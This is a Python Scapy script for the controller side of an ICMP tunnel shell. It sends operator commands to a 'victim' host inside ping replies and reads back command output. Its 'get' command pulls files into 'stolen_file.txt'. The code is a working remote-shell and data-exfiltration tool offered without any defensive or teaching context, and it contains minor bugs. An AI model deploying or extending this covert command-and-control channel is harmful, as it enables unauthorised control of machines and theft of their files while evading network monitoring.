from scapy.all import *
import os
import time
 
ICMP_ID = int(13331)
TTL = int(64)
ICMP_ID_HELO = int(23144)
my_iface = "ens160"
victim_ip = ""
active = False
 
def ignoreICMP():
    try:
        f = open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w+")
        contents = f.read()
        if contents[0] != "1":
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        f.close()
    except:
        print("[!] You need to run this tool with administrator privileges.")
        sys.exit() 

 
def SendCmd(command):
    pkt = sniff(filter="icmp", timeout=2)
    if pkt and pkt[0][ICMP].id == ICMP_ID:
        victim_ip = pkt[0][IP].src

        if command.split()[0] == "get":
            curr_seq = 1
            while True:
                pkt = sniff(filter="icmp",count=1, timeout=3)
                if pkt:
                    payload = pkt[0][IP].payload.load.decode('utf-8')
                    if pkt[0][ICMP].seq == 0:
                        send(IP(dst=victim_ip)/ICMP(type=0, id=ICMP_ID, seq=curr_seq) / command)
                        pass
                    elif payload != "end":
                        f = open("stolen_file.txt", "a")
                        f.write(payload)
                        f.close()
                        curr_seq = pkt[0][ICMP].seq
                        send(IP(dst=victim_ip)/ICMP(type=0, id=ICMP_ID, seq=curr_seq) / command)


                    if payload == "end":
                        break
                        curr_seq = curr_seq + 1 
                    send(IP(dst=victim_ip)/ICMP(type=0, id=ICMP_ID, seq=curr_seq) / "")

        else:
            curr_seq = 1
            while True:
                pkt = sniff(filter="icmp",count=1, timeout=3)
                if pkt:
                    if pkt[0][ICMP].seq == 0:
                        send(IP(dst=victim_ip)/ICMP(type=0, id=ICMP_ID, seq=curr_seq) / command)
                        pass
                    payload = pkt[0][IP].payload.load.decode('utf-8')
                    print(payload)
                    curr_seq = pkt[0][ICMP].seq
                    print(payload)
                    if payload == "end":
                        break
                    curr_seq = curr_seq + 1 
                    send(IP(dst=victim_ip)/ICMP(type=0, id=ICMP_ID, seq=curr_seq) / "")







def main():
    ignoreICMP()
   
    while True:
        command = input("shell: ") 
        if command == "exit":
            break

        elif command == "":
            pass

        else:
            SendCmd(command)
            icmp_shell = ""

 
if __name__ == "__main__":
    main()